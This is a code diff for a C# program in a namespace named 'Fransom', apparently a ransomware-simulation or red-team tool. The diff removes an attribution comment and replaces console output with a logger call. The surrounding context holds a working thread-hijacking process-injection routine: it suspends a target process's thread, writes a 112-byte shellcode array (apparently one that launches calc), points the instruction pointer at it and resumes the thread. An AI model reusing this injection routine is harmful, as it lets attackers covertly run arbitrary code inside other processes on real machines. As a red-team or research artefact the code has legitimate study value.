@@ -1,7 +1,4 @@
-﻿// Lifted from:
-// https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/thread-hijack.cs
-// #stealwithpride
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -250,7 +247,7 @@ namespace Fransom
 
             // Open and Suspend first thread
             ProcessThread pT = targetProcess.Threads[0];
-            Console.WriteLine("ThreadId: " + targetProcess.Threads[0].Id);
+            Logger.WriteLine("ThreadId: " + targetProcess.Threads[0].Id);
             IntPtr pOpenThread = OpenThread(ThreadAccess.THREAD_HIJACK, false, (uint)pT.Id);
             SuspendThread(pOpenThread);
 
@@ -259,7 +256,7 @@ namespace Fransom
             tContext.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
             if (GetThreadContext(pOpenThread, ref tContext))
             {
-                Console.WriteLine("CurrentEip    : {0}", tContext.Rip);
+                Logger.WriteLine("CurrentEip    :" + tContext.Rip);
             }
 
             byte[] payload = new byte[112] { 0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3};
@@ -293,7 +290,7 @@ namespace Fransom
             int bytesRead = 0;
             byte[] buffer = new byte[shellcode.Length];
             ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
-            Console.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));
+            Logger.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));
 
             // Set context EIP to location of shellcode
             tContext.Rip = (ulong)allocMemAddress.ToInt64();
@@ -301,15 +298,15 @@ namespace Fransom
             // Apply new context to suspended thread
             if (!SetThreadContext(pOpenThread, ref tContext))
             {
-                Console.WriteLine("Error setting context");
+                Logger.WriteLine("Error setting context");
             }
             if (GetThreadContext(pOpenThread, ref tContext))
             {
-                Console.WriteLine("ShellcodeAddress: " + allocMemAddress);
-                Console.WriteLine("NewEip          : {0}", tContext.Rip);
+                Logger.WriteLine("ShellcodeAddress: " + allocMemAddress);
+                Logger.WriteLine("NewEip         : " + tContext.Rip);
             }
             // Resume the thread, redirecting execution to shellcode, then back to original process
-            Console.WriteLine("Redirecting execution!");
+            Logger.WriteLine("Redirecting execution!");
             ResumeThread(pOpenThread);
         }
     }
